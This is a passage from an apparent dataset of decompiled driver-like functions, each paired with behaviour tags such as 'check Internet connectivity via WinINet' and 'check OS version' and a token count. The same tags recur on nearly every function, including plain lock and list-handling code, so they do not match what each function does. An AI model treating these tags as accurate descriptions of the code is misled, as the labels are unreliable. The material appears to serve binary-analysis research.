        "decompiled_code": "\nint32_t __cdecl fcn.00052750(uint arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t *arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t var_80h;\n    int32_t var_7ch;\n    uint var_78h;\n    int32_t var_68h;\n    int32_t var_64h;\n    int32_t *var_60h;\n    uint var_5ch;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_80h = 0;\n    fcn.00037640(0x800ce848, &var_4h, 0);\n    var_ch = fcn.0003f990(arg_8h, 1);\n    if (var_ch != 0) {\n        if (((arg_ch == 1) && (arg_10h == 0x1010e)) && (*(var_ch + 0x444) != 0)) {\n            var_8h = *arg_14h;\n            if (var_8h != 0) {\n                var_8h = 1;\n            }\n            arg_14h = &var_8h;\n        }\n        var_80h = *(var_ch + 4);\n    }\n    fcn.00037670(0x800ce848, &var_4h, 0);\n    if (var_80h == 0) {\n        var_7ch = -0x3ffffddb;\n    }\n    else {\n        iVar1 = fcn.000344b0(&var_18h);\n        if (iVar1 == 0) {\n            var_7ch = -0x3fffffff;\n        }\n        else {\n            var_68h = arg_ch;\n            var_64h = arg_10h;\n            var_60h = arg_14h;\n            var_5ch = arg_18h;\n            fcn.00078bd6(&var_7ch, var_80h, &var_78h);\n            if (var_7ch == 0x103) {\n                fcn.000345a0(&var_18h, 0xffffffff);\n                var_7ch = var_1ch;\n            }\n            fcn.00034540(&var_18h);\n        }\n    }\n    return var_7ch;\n}\n",
        "token_count": 552
    },
    "00052880": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00052880(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint arg_18h, uint32_t arg_1ch, \n            uint32_t arg_20h)\n\n{\n    int16_t iVar1;\n    uint32_t arg_8h_00;\n    char cVar2;\n    int16_t iVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = *(arg_8h + 8);\n    if ((arg_8h_00 != 0) && (arg_8h_00 < 0x65)) {\n        fcn.000574b0(0);\n        if (arg_14h == 0xe) {\n            fcn.0004ffd0(arg_8h_00, arg_10h, arg_18h, arg_1ch);\n        }\n        fcn.00037640(arg_8h + 0x430, &var_4h, 0);\n        if (*(arg_8h + 0x424) == 0) {\n            var_8h = 0;\n        }\n        else {\n            var_8h = fcn.00064ac0(*(arg_8h + 0x424));\n        }\n        fcn.00037670(arg_8h + 0x430, &var_4h, 0);\n        if (var_8h == 0) {\n            if ((arg_14h == 0xe) && (iVar1 = *(arg_10h + 0xc),  iVar3 = fcn.00035980(0x7ff),  iVar1 == iVar3)) {\n                var_8h = 1;\n            }\n        }\n        else {\n            fcn.000574e0(0);\n        }\n        if (var_8h != 0) {\n            if (arg_1ch < arg_20h) {\n                cVar2 = fcn.000529f0(*(arg_8h + 4), arg_ch, arg_10h, arg_14h, arg_20h);\n                if (cVar2 == '\\0') {\n                    fcn.00052c90(*(arg_8h + 4), arg_10h, arg_14h, arg_18h, arg_1ch);\n                }\n            }\n            else {\n                fcn.00052c90(*(arg_8h + 4), arg_10h, arg_14h, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 602
    },
    "000529f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __cdecl fcn.000529f0(int32_t arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    int32_t **var_20h;\n    int32_t var_1ch;\n    int32_t **var_18h;\n    uint32_t var_11h;\n    uint32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_4h = 0;\n    var_18h = NULL;\n    var_1ch = 0;\n    var_11h._0_1_ = 0;\n    uVar1 = fcn.000356f0(arg_14h + arg_18h);\n    unique0x1000018a = uVar1;\n    if ((uVar1 != 0) && (uVar1 = (**0x80051024)(&var_ch, &var_4h, *0x800ce970, uVar1, arg_14h),  var_ch == 0)) {\n        fcn.00078be8(stack0xffffffec, arg_10h, arg_14h);\n        uVar1 = (**0x80051024)(&var_ch, &var_18h, *0x800ce970, stack0xffffffec + arg_14h, arg_18h);\n        if ((var_ch == 0) && (uVar1 = (**0x8005105c)(&var_ch, &var_1ch, *0x800ce974),  var_ch == 0)) {\n            for (var_20h = var_18h; *var_20h != NULL; var_20h = *var_20h) {\n            }\n            if (*(var_1ch + 8) == 0) {\n                *(var_1ch + 0xc) = var_20h;\n            }\n            *var_20h = *(var_1ch + 8);\n            *(var_1ch + 8) = var_18h;\n            *(var_1ch + 0x1c) = 0;\n            *(var_1ch + 0x40) = var_4h;\n            uVar1 = (**(arg_8h + 0x34))(*(arg_8h + 4), arg_ch, 0, arg_18h, var_1ch, &var_8h);\n            var_ch = uVar1;\n            if (uVar1 == 0) {\n                uVar1 = fcn.00052c90(arg_8h, stack0xffffffec, arg_14h, stack0xffffffec + arg_14h, var_8h);\n                var_11h._0_1_ = 1;\n            }\n            else if (uVar1 == 0x103) {\n                var_1ch = 0;\n                var_4h = 0;\n                var_18h = NULL;\n                stack0xffffffec = 0;\n                var_11h._0_1_ = 1;\n            }\n        }\n    }\n    if (var_1ch != 0) {\n        uVar1 = (**0x80051060)(var_1ch);\n    }\n    if (var_4h != 0) {\n        uVar1 = (**0x800512a4)(var_4h);\n    }\n    if (var_18h != NULL) {\n        uVar1 = (**0x800512a4)(var_18h);\n    }\n    if (stack0xffffffec != 0) {\n        uVar1 = fcn.000357f0(stack0xffffffec);\n    }\n    return uVar1 & 0xffffff00 | var_11h;\n}\n",
        "token_count": 912
    },
    "00052bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00052bc0(void)\n\n{\n    int32_t arg_8h;\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    if (*0x800ce673 != '\\0') {\n        for (var_8h = 0; var_8h < 100; var_8h = var_8h + 1) {\n            fcn.00037640(0x800ce848, &var_4h, 0);\n            iVar2 = fcn.0003f990(var_8h, 1);\n            if ((iVar2 == 0) || (*(iVar2 + 0xc) != 0)) {\n                fcn.00037670(0x800ce848, &var_4h, 0);\n            }\n            else {\n                arg_8h = *(iVar2 + 4);\n                iVar1 = *(iVar2 + 0x440);\n                arg_ch = *(iVar2 + 0x444);\n                fcn.00037670(0x800ce848, &var_4h, 0);\n                fcn.00051310(arg_8h, arg_ch);\n                if ((arg_8h == 0) && (iVar1 != 0)) {\n                    fcn.00052460(var_8h);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 343
    },
    "00052e20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00052e20(int32_t *arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10h = 0;\n    var_ch = 0;\n    if (arg_ch == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        fcn.00037640(0x800ce848, &var_4h, 0);\n        if ((arg_ch != 0) && (*(arg_ch + 4) != 0)) {\n            var_ch = *(arg_ch + 8);\n            var_10h = *(arg_ch + 4);\n        }\n        fcn.00037670(0x800ce848, &var_4h, 0);\n        if (var_10h == 0) {\n            *arg_8h = 0;\n        }\n        else {\n            iVar1 = fcn.00051be0(var_ch, 0);\n            *arg_8h = iVar1;\n            iVar1 = fcn.00052750(var_ch, 1, 0x1010103, 0, 4);\n            *arg_8h = iVar1;\n            fcn.00051420(var_10h);\n            *(arg_ch + 0x43c) = arg_10h;\n            (**0x80051070)(arg_8h, var_10h);\n            *(arg_ch + 4) = 0;\n            if (*arg_8h == 0x103) {\n                iVar1 = fcn.00041780(arg_ch);\n                *arg_8h = iVar1;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "00052f40": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00052f40(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    if (*0x800ce673 == '\\0') {\n        uVar2 = 0xc0000001;\n    }\n    else {\n        fcn.00037640(0x800ce848, &var_8h, 0);\n        var_ch = *0x800ce840;\n        while ((var_ch != NULL &&\n               (((var_ch[3] != 0 || (var_ch[1] == 0)) ||\n                ((*(var_ch[1] + 8) != arg_8h && (cVar1 = fcn.00051890(var_ch[1], arg_8h),  cVar1 == '\\0'))))))) {\n            var_ch = *var_ch;\n        }\n        if (var_ch == NULL) {\n            var_14h = 0;\n        }\n        else {\n            var_14h = var_ch[2];\n        }\n        var_4h = var_14h;\n        fcn.00037670(0x800ce848, &var_8h, 0);\n        if (var_ch == NULL) {\n            uVar2 = 0xc0000001;\n        }\n        else {\n            uVar2 = fcn.00051e20(var_4h, arg_ch, arg_10h);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 372
    },
    "00053020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00053020(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t *var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_ch = *0x800ce978;\n    if (*0x800ce978 != 0) {\n        fcn.00051a00(arg_8h, 0, 0, &var_14h, &var_10h);\n        var_1ch = var_10h;\n        if ((*(var_ch + 0x42c) == 0x80) || (*(var_ch + 0x42c) == 0x20)) {\n            fcn.000574b0(0);\n            fcn.00037640(var_ch + 0x430, &var_8h, 0);\n            if (*(var_ch + 0x424) == 0) {\n                var_4h = 0;\n            }\n            else {\n                var_4h = fcn.00065320(*(var_ch + 0x424));\n            }\n            fcn.00037670(var_ch + 0x430, &var_8h, 0);\n        }\n        else {\n            var_4h = 0;\n        }\n        if (var_4h != 0) {\n            fcn.000574e0(0);\n            if (*var_14h == 0) {\n                if (*0x10 != 0x1c) {\n                    if ((*(var_14h + 6) & 5) == 0) {\n                        var_20h = (**0x80051230)(var_14h, 0);\n                    }\n                    else {\n                        var_20h = var_14h[3];\n                    }\n                    var_18h = var_20h;\n                }\n                var_1ch = var_14h[5];\n                if (0xe < var_1ch) {\n                    fcn.00052c90(*(var_ch + 4), var_18h, 0xe, var_18h + 0xe, var_1ch - 0xe);\n                }\n            }\n            else {\n                var_18h = fcn.000356f0(var_1ch);\n                if (var_18h != 0) {\n                    iVar1 = fcn.00078bdc(var_14h, 0, var_18h, 0, var_1ch, &var_1ch);\n                    if ((iVar1 == 0) && (0xe < var_1ch)) {\n                        fcn.00052c90(*(var_ch + 4), var_18h, 0xe, var_18h + 0xe, var_1ch - 0xe);\n                    }\n                    fcn.000357f0(var_18h);\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 680
    },
    "000531d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_88h\n\nvoid __cdecl fcn.000531d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_88h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.00035150();\n    if (iVar1 < 0x1b) {\n        fcn.00056530(arg_8h, arg_ch);\n        do {\n            iVar1 = fcn.000560b0();\n            if (iVar1 != 0) break;\n        } while (var_4h != 0);\n        fcn.000566b0(arg_8h, arg_ch);\n        fcn.00053330(arg_8h, arg_ch);\n    }\n    else {\n        do {\n            var_88h = arg_ch;\n            iVar1 = fcn.000464e0(arg_ch, &var_88h, 0x80, &var_4h, 0xffffffff);\n            if (iVar1 != 0) break;\n        } while (var_4h != 0);\n        fcn.00046490(arg_ch);\n    }\n    return;\n}\n",
        "token_count": 261
    },
    "00053300": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00053300(code *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00035150();\n    if ((iVar1 < 0x1b) && (arg_8h != NULL)) {\n        (*arg_8h)(arg_ch, arg_10h, 0, 0, 0, 0, 4);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "000533d0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000533d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar1 = fcn.000533b0(0x800da984, 1, 0);\n    if (iVar1 == 1) {\n        var_4h = 0;\n    }\n    else {\n        iVar1 = fcn.00034f40(0x80055664, &var_8h);\n        if (iVar1 == 0) {\n            iVar1 = fcn.0005cd70(var_8h, 0x8005566c, 0x800cdac8);\n            if (iVar1 == 0) {\n                iVar1 = fcn.0005cd70(var_8h, 0x80055680, 0x800cdacc);\n                if (iVar1 == 0) {\n                    var_4h = fcn.00053760();\n                    if (((var_4h == 0) && (var_4h = fcn.000161f0(0x80055694, 0x800ce97c),  var_4h == 0)) &&\n                       (var_4h = fcn.00016000(*0x800ce97c, 0x80093510, 0),  var_4h == 0)) {\n                        var_4h = 0;\n                    }\n                    if (var_4h != 0) {\n                        fcn.000534c0(arg_8h);\n                        fcn.00037420(0x800da984);\n                    }\n                }\n                else {\n                    var_4h = -0x3fffffff;\n                }\n            }\n            else {\n                var_4h = -0x3fffffff;\n            }\n        }\n        else {\n            var_4h = -0x3fffffff;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 431
    },
    "000534c0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.000534c0(void)\n\n{\n    if (*0x800da984 != 0) {\n        *0x800da984 = 0;\n        fcn.000537b0();\n        if (*0x800ce97c != 0) {\n            fcn.000160b0(*0x800ce97c);\n            (**0x800512e0)();\n        }\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "00053760": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.00053760(void)\n\n{\n    uint uVar1;\n    \n    *0x800cdac4 = fcn.000356f0(0x4000);\n    if (*0x800cdac4 == 0) {\n        uVar1 = 0xc000009a;\n    }\n    else {\n        fcn.00078bfa(*0x800cdac4, 0, 0x4000);\n        fcn.000326e0(0x800da9f0);\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 130
    },
    "000537b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00053b91)\n// WARNING: Removing unreachable block (ram,0x00053bc1)\n// WARNING: Removing unreachable block (ram,0x00053bc8)\n// WARNING: Removing unreachable block (ram,0x00053bd1)\n// WARNING: Removing unreachable block (ram,0x00053be4)\n// WARNING: Removing unreachable block (ram,0x00053bed)\n// WARNING: Removing unreachable block (ram,0x00053bfd)\n// WARNING: Removing unreachable block (ram,0x00053c2a)\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Removing unreachable block (ram,0x00053961)\n// WARNING: Removing unreachable block (ram,0x000538c8)\n// WARNING: Removing unreachable block (ram,0x000538f8)\n// WARNING: Removing unreachable block (ram,0x000538ff)\n// WARNING: Removing unreachable block (ram,0x00053908)\n// WARNING: Removing unreachable block (ram,0x0005391b)\n// WARNING: Removing unreachable block (ram,0x00053924)\n// WARNING: Removing unreachable block (ram,0x00053934)\n// WARNING: Removing unreachable block (ram,0x00053c35)\n// WARNING: Removing unreachable block (ram,0x0005396c)\n// WARNING: Removing unreachable block (ram,0x00053c4c)\n// WARNING: Removing unreachable block (ram,0x00053983)\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.000537b0(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_14h = 0;\n    var_ch = 0;\n    if (*0x800cdac4 != 0) {\n        (**0x800510d0)(&var_28h, 0, 0);\n        for (var_8h = 0; var_8h < 0x1000; var_8h = var_8h + 1) {\ncode_r0x000537ff:\n            var_18h = 0;\n            var_44h = 0;\n            var_1h._0_1_ = (**0x8005100c)();\n            for (var_10h = *(*0x800cdac4 + var_8h * 4); var_10h != NULL; var_10h = *var_10h) {\n                if (((var_10h[8] != 0) && (var_10h[10] == 2)) && (*(var_10h + 0xb6) != 0)) {\n                    var_18h = var_10h[8];\n                    var_44h = var_10h[7];\n                    var_10h[8] = 0;\n                    break;\n                }\n            }\n            (**0x80051010)();\n            if (var_18h != 0) {\n                var_40h = (**0x80051234)(3, var_44h, 0, 0, 0, 0, 1, &var_28h, &var_4ch);\n                if (var_40h != 0) {\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -4) = 0;\n                    *(iVar1 + -0x21) = 0;\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -0x24) = 0xf;\n                    *(iVar1 + -0x23) = 6;\n                    *(iVar1 + -0x10) = var_44h;\n                    *(iVar1 + -0xc) = var_18h;\n                    *(iVar1 + -0x20) = 4;\n                    *(iVar1 + -0x1c) = 0;\n                    *(iVar1 + -0x18) = 0;\n                    *(iVar1 + -0x14) = 0;\n                    var_3ch = (**0x80051288)();\n                    if (var_3ch == 0x103) {\n                        (**0x80051194)(&var_28h, 0, 0, 0, 0);\n                        var_3ch = var_4ch;\n                    }\n                }\n                goto code_r0x000537ff;\n            }\n        }\n        var_38h = 0xffb3b4c0;\n        var_34h = 0xffffffff;\n        (**0x8005130c)(0, 0, &var_38h);\n        for (var_8h = 0; var_8h < 0x1000; var_8h = var_8h + 1) {\ncode_r0x00053a63:\n            var_50h = 0;\n            var_44h = 0;\n            var_2ch = 0;\n            var_1h._0_1_ = (**0x8005100c)();\n            for (var_10h = *(*0x800cdac4 + var_8h * 4); var_10h != NULL; var_10h = *var_10h) {\n                var_50h = 0;\n                if ((var_10h[8] != 0) && (var_10h[10] == 1)) {\n                    for (var_54h = 0; var_54h < 0xb; var_54h = var_54h + 1) {\n                        if (var_10h[var_54h * 3 + 0xc] != 0) {\n                            var_14h = var_54h;\n                            var_50h = var_10h[var_54h * 3 + 0xc];\n                            var_ch = var_10h[var_54h * 3 + 0xd];\n                            var_44h = var_10h[7];\n                            var_2ch = var_10h[8];\n                            var_10h[var_54h * 3 + 0xc] = 0;\n                            break;\n                        }\n                    }\n                    if (var_50h != 0) break;\n                }\n            }\n            (**0x80051010)();\n            if (var_50h != 0) {\n                var_40h = (**0x80051234)(3, var_44h, 0, 0, 0, 0, 1, &var_28h, &var_4ch);\n                if (var_40h != 0) {\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -8) = 0;\n                    *(iVar1 + -4) = 0;\n                    *(iVar1 + -0x21) = 0;\n                    iVar1 = *(var_40h + 0x60);\n                    *(iVar1 + -0x24) = 0xf;\n                    *(iVar1 + -0x23) = 0xb;\n                    *(iVar1 + -0x10) = var_44h;\n                    *(iVar1 + -0xc) = var_2ch;\n                    *(iVar1 + -0x20) = var_14h;\n                    *(iVar1 + -0x1c) = var_50h;\n                    *(iVar1 + -0x18) = var_ch;\n                    var_3ch = (**0x80051288)();\n                    if (var_3ch == 0x103) {\n                        (**0x80051194)(&var_28h, 0, 0, 0, 0);\n                        var_3ch = var_4ch;\n                    }\n                    var_10h = fcn.00054100(var_2ch, &var_1h);\n                    if (var_10h != NULL) {\n                        var_10h[var_14h * 3 + 0xc] = 0;\n                        (**0x80051010)();\n                    }\n                }\n                goto code_r0x00053a63;\n            }\n        }\n        var_1h._0_1_ = (**0x8005100c)();\n        for (var_8h = 0; var_8h < 0x1000; var_8h = var_8h + 1) {\n            var_10h = *(*0x800cdac4 + var_8h * 4);\n            while (var_10h != NULL) {\n                puVar2 = *var_10h;\n                fcn.000357f0(var_10h);\n                var_10h = puVar2;\n            }\n        }\n        fcn.000357f0(*0x800cdac4);\n        *0x800cdac4 = 0;\n        (**0x80051010)();\n    }\n    return;\n}\n",
        "token_count": 2144
    },
    "00053da0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00053da0(uint arg_8h, uint32_t arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h, int32_t arg_1ch)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint var_34h;\n    uint *var_30h;\n    uint *var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    uint var_1ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar3 = (arg_ch >> 5) % 0x1000;\n    var_1h._0_1_ = 0;\n    if (arg_ch == 0) {\n        return 0xc00000f0;\n    }\n    fcn.00036d40(&var_1ch, 0x11);\n    if (arg_1ch == 0) {\n        var_1h._0_1_ = (**0x8005100c)();\n    }\n    for (var_20h = *(*0x800cdac4 + uVar3 * 4); (var_20h != NULL && (var_20h[8] != arg_ch)); var_20h = *var_20h) {\n    }\n    if (var_20h == NULL) {\n        var_20h = fcn.000356f0(0x164);\n        if (var_20h == NULL) {\n            var_24h = 0xc000009a;\n            goto code_r0x00053ffd;\n        }\n        fcn.00078bfa(var_20h, 0, 0x164);\n        *var_20h = *(*0x800cdac4 + uVar3 * 4);\n        *(*0x800cdac4 + uVar3 * 4) = var_20h;\n        var_20h[8] = arg_ch;\n        for (var_8h = 0; var_8h < 0xb; var_8h = var_8h + 1) {\n            var_20h[var_8h * 3 + 0xb] = arg_ch;\n        }\n    }\n    else {\n        var_20h[9] = 0;\n        fcn.00078bfa(var_20h + 0xb, 0, 0x84);\n        fcn.00078bfa(var_20h + 0x2c, 0, 0x4b);\n        fcn.00078bfa(var_20h + 0xfb, 0, 0x4b);\n        var_20h[0x52] = 0;\n        var_20h[0x53] = 0;\n        var_20h[0x54] = 0;\n        *(var_20h + 0x55) = 0;\n        *(var_20h + 0x155) = 0;\n        var_20h[0x56] = 0;\n        for (var_8h = 0; var_8h < 0xb; var_8h = var_8h + 1) {\n            var_20h[var_8h * 3 + 0xb] = arg_ch;\n        }\n    }\n    uVar2 = fcn.00078a1a();\n    var_20h[1] = uVar2;\n    var_2ch = &var_1ch;\n    var_30h = var_20h + 2;\n    do {\n        cVar1 = *var_2ch;\n        *var_30h = cVar1;\n        var_2ch = var_2ch + 1;\n        var_30h = var_30h + 1;\n    } while (cVar1 != '\\0');\n    var_20h[7] = arg_8h;\n    var_20h[10] = arg_10h;\n    var_20h[0x52] = 0x54694343;\n    var_20h[0x54] = arg_14h;\n    var_20h[0x53] = arg_ch;\n    if (arg_18h != NULL) {\n        *arg_18h = var_20h + 0x52;\n    }\n    fcn.000326c0(var_20h + 0x57);\n    var_24h = 0;\ncode_r0x00053ffd:\n    if (arg_1ch == 0) {\n        (**0x80051010)();\n    }\n    return var_24h;\n}\n",
        "token_count": 1060
    },
    "00054020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00054020(uint32_t arg_8h, uint *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint var_14h;\n    uint var_10h;\n    uint *var_ch;\n    uint *var_8h;\n    uint var_1h;\n    \n    uVar1 = (arg_8h >> 5) % 0x1000;\n    if (arg_8h == 0) {\n        var_10h = 0xc00000ef;\n    }\n    else {\n        (**0x8005100c)();\n        var_ch = NULL;\n        for (var_8h = *(*0x800cdac4 + uVar1 * 4); (var_8h != NULL && (var_8h[8] != arg_8h)); var_8h = *var_8h) {\n            var_ch = var_8h;\n        }\n        if (var_8h == NULL) {\n            var_10h = 0xc0000034;\n        }\n        else {\n            if (arg_ch != NULL) {\n                *arg_ch = var_8h[10];\n            }\n            if (var_ch == NULL) {\n                *(*0x800cdac4 + uVar1 * 4) = *var_8h;\n            }\n            else {\n                *var_ch = *var_8h;\n            }\n            fcn.000357f0(var_8h);\n            var_10h = 0;\n        }\n        (**0x80051010)();\n    }\n    return var_10h;\n}\n",
        "token_count": 362
    },
    "00054100": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00054100(uint32_t arg_8h, uchar *arg_ch)\n\n{\n    uchar uVar1;\n    uint var_8h;\n    uint *var_4h;\n    \n    if ((arg_8h == 0) || (*0x800cdac4 == 0)) {\n        var_4h = NULL;\n    }\n    else {\n        if (arg_ch != NULL) {\n            uVar1 = (**0x8005100c)();\n            *arg_ch = uVar1;\n        }\n        for (var_4h = *(*0x800cdac4 + ((arg_8h >> 5) % 0x1000) * 4); (var_4h != NULL && (var_4h[8] != arg_8h));\n            var_4h = *var_4h) {\n        }\n        if ((var_4h == NULL) && (arg_ch != NULL)) {\n            (**0x80051010)();\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 228
    },
    "000541a0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
